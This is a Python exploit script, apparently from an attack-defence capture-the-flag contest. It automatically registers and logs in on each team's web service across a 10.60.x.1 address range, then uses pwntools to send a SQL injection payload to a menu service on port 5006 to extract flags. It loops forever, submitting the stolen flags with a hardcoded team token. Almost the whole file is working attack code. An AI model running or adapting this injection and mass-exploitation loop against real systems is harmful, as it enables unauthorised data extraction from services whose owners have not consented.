import requests
import re
from pwn import *
import time

db_flag = []

def register(ip):

    url = f"http://{ip}:80/register"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.60.3.1", "DNT": "1", "Connection": "close", "Referer": "http://10.60.3.1/register", "Upgrade-Insecure-Requests": "1", "Sec-GPC": "1"}
    data = {"team_name": "test12345678", "password": "test12345678", "submit": "Register"}
    r = requests.post(url, headers=headers, data=data)

def login(ip):

    url = f"http://{ip}:80/login"
    print(url)
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.60.10.1", "DNT": "1", "Connection": "close", "Referer": "http://10.60.10.1/login", "Upgrade-Insecure-Requests": "1", "Sec-GPC": "1"}
    data = {"team_name": "test12345678", "password": "test12345678", "submit": "Login"}
    r = requests.post(url, headers=headers, data=data) 
    return r.headers['Set-Cookie'].split(";")[0].split("=")[1]

def getUsername(ip):

    url = f"http://{ip}:80/scoreboard"
    req_score = requests.get(url)
            
    # USERNAME
    asd = req_score.text.split('<td id="username">')[1]
    team = asd.split("</td>")[0]
    print(team)
    return team

def attack(ip):
    
    try:
        register(ip)
        session = login(ip)
        #nome_team = getUsername(ip)

        burp0_url = f"http://{ip}:80/attack"
        burp0_cookies = {"session": session}
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.60.0.1", "DNT": "1", "Connection": "close", "Referer": "http://10.60.0.1/attack", "Upgrade-Insecure-Requests": "1", "Sec-GPC": "1"}
        burp0_data = {"team": "ciccio1234!", "service": "2", "submit": "Attack!"}
        r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        p = re.compile('token is: <code>((\d|[a-z])+)</code>')

        token = p.findall(r.text)[0][0]
        #print(token)
        io = remote(f"{ip}", 5006)
        io.recvuntil("Enter your token: ")
        io.sendline(token.encode())
        io.recvuntil(">")
        io.sendline(b"n")
        io.recvuntil(">")
        io.sendline(b"1")
        io.recvuntil(">")
        io.sendline(b"prova'),(3, (SELECT data FROM heap WHERE ptr=1))--")
        io.recvuntil(">")
        io.sendline(b"1")
        io.recvuntil(">")
        io.sendline(b"prova")
        io.recvuntil(">")
        io.sendline(b"2")
        io.recvuntil(">")
        io.sendline(b"3")
        print(io.recvline())
        flag = io.recvline().decode('utf-8')
        submit(ip, session, flag)

        print(f"IP: {ip}, FLAG {flag}")
    except Exception as e:
        print(e)
        pass

def sendRealFlag():
    print("Invio le flag vere!")
    print(db_flag)
    TEAM_TOKEN = '244b2fe45d26e3b032ad560e6890b4ce'

    #flags = ['AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=']

    print(requests.put('http://10.10.0.1:8080/flags', headers={
        'X-Team-Token': TEAM_TOKEN
    }, json=db_flag).text)
    db_flag.clear()


def submit(ip, session, flag):

    burp0_url = f"http://{ip}:80/submit"
    burp0_cookies = {"session": session}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.60.3.1", "DNT": "1", "Connection": "close", "Referer": "http://10.60.3.1/submit", "Upgrade-Insecure-Requests": "1", "Sec-GPC": "1"}
    burp0_data = {"flag": flag.strip(), "team": "ciccio1234!", "service": "2", "submit": "Send"}
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    p = re.compile("[A-Z0-9]{31}=")
    print(p.findall(r.text)[0])
    db_flag.append(p.findall(r.text)[0])

def repeat():
    while True:
        for i in range(1, 35):
            if i == 29:
                continue
    
            attack(f"10.60.{i}.1")
        sendRealFlag()
        time.sleep(90)


repeat()
